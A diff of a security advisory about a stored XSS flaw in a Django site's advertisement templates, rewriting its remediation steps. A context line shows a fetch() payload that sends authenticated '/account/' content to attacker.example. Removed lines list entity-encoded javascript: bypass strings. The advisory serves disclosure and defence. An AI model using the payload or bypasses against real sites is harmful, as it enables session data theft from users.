@@ -68,6 +68,10 @@ Expected rendered markup in the ad slot (`ad_banner.html:62`):
 
 A victim who clicks the link triggers the `alert`. An attacker can replace `alert(document.domain)` with a same-origin request, for example `fetch('/account/', {credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+encodeURIComponent(t)))`, to exfiltrate authenticated page content.
 
+**Browser-side validation (local environment):**
+
+![Browser-side validation on the advertisement detail page](stored_xss.png)
+
 # Risk
 
 | Dimension | Impact |
@@ -80,11 +84,12 @@ Overall severity: **High** - stored, cross-origin-reaching script execution on h
 
 # Remediation
 
-1. Remove `|safe` from `Advertisement/templates/advertisement/includes/ad_banner.html:62`, `detail.html:46` and `admin_pending.html:54`, and store/render the body as plain text or sanitised HTML that Django escapes correctly.
-2. Replace the regex sanitiser in `Forum/Utils/markdown_utils.py` (`sanitize_html`, `sanitize_url`) with a real HTML sanitiser such as `bleach.clean()` with an explicit allow-list of tags and protocols (`http`, `https`, `mailto`). Validate URLs after HTML-entity decoding, or render link targets through a parser instead of string prefix checks.
-3. Disable raw HTML and attribute-list processing for ad bodies (`attr_list` is enabled through `markdown.extensions.extra`), or render ad bodies with a restricted markdown configuration.
-4. Add a strict `Content-Security-Policy` (for example `script-src 'self'` with no `javascript:` navigations allowed) as defence in depth.
-5. Add regression tests in `Advertisement/tests.py` that submit `jav&#x09;ascript:`, `java&#10;script:` and `&#106;avascript:` bodies and assert that the rendered `href` is neutralised.
+1. **Replace the regex-based HTML sanitiser** — update `Forum/Utils/markdown_utils.py` to use a maintained, parser-based HTML sanitisation library such as `nh3.clean()`, with explicit allow-lists of permitted HTML tags, attributes and URL schemes.
+2. **Restrict Markdown rendering** — use a dedicated Markdown configuration for advertisement bodies, disabling raw HTML and unnecessary extensions, including `attr_list` where it is not required.
+3. **Enforce safe HTML rendering** — review the use of `|safe` in advertisement templates. Only render HTML that has passed the approved sanitisation process. If rich-text rendering is not required, remove `|safe` and rely on Django's default HTML escaping.
+4. **Re-sanitise existing advertisement content** — regenerate stored `Advertisement.body_html` values using the updated sanitisation policy to ensure that previously stored content complies with the new security requirements.
+5. **Implement a restrictive Content-Security-Policy (CSP)** — restrict script execution to authorised resources and avoid `unsafe-inline`. Ensure that the policy is preserved by the reverse proxy. CSP must remain a defence-in-depth measure rather than a replacement for HTML sanitisation.
+6. **Add regression tests** — extend `Advertisement/tests.py` and the shared Markdown sanitisation tests to verify that unsafe content is neutralised, legitimate formatting is preserved and all advertisement rendering contexts comply with the sanitisation policy.
 
 # Author
 WOCSA
